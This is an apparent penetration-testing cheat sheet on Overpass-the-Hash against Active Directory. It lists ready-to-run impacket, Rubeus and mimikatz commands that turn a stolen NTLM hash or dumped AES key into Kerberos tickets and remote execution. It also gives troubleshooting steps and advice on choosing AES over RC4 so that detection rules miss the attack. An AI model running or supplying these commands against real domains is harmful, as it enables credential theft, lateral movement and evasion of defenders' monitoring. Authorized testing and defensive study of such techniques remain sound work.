---
tags: [pentest, kerberos, opth, overpass-the-hash, ad, active-directory, initial-access, windows]
phase: 5
---
# Overpass-the-Hash (OPtH)

Use an NTLM hash to request a Kerberos TGT (and from there, service tickets). Bridges PtH → PtT.

[[06 - Gaining Access/00 - README|Folder index]]

## Why this matters

If the target requires Kerberos (NTLM disabled / restricted), you can't PtH. But if you have the user's NTLM hash, you can still ask the KDC for a TGT (the KDC uses the hash as a long-term key). Then you have a normal Kerberos ticket.

## Linux

```bash
impacket-getTGT -hashes :<NTLM> corp.local/user -dc-ip 10.0.0.5
export KRB5CCNAME=$(pwd)/user.ccache

# Verify
klist

# Now use Kerberos auth normally
impacket-psexec -k -no-pass corp.local/user@host.corp.local
nxc smb host.corp.local -k --use-kcache
```

## Windows (Rubeus)

```cmd
Rubeus.exe asktgt /user:alice /rc4:<NTLM> /domain:corp.local /dc:dc01.corp.local /ptt
```

Or with AES key (more modern / stealthier):

```cmd
Rubeus.exe asktgt /user:alice /aes256:<aes256_key> /domain:corp.local /ptt
```

## Get AES keys instead of NTLM (better OpSec)

mimikatz can dump AES keys from LSASS:

```text
sekurlsa::ekeys
```

Then:

```cmd
Rubeus.exe asktgt /user:alice /aes256:<key> /domain:corp.local /ptt
```

AES tickets are RC4-free → bypass detection rules looking for RC4 ticket types.

## When to use OPtH instead of PtH

| Scenario | Use |
| --- | --- |
| Target requires Kerberos | OPtH |
| Detection rules flag PtH attempts | OPtH with AES |
| Want to use a forged ticket later | Get TGT now via OPtH, use later |
| You have a hash but no working PtH path | OPtH gives Kerberos path |

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| `KDC_ERR_ETYPE_NOSUPP` with RC4 | Domain disabled RC4. Use AES keys (dump with `sekurlsa::ekeys`). |
| `Client not found` | Wrong realm string. Realms are case-sensitive in some tools - try UPPERCASE `CORP.LOCAL`. |
| `Bad request` | Time skew. Sync clock. |

> [!tip] AES > RC4
> Whenever you have a choice, use AES keys. RC4 tickets are increasingly fingerprinted by detection tools.
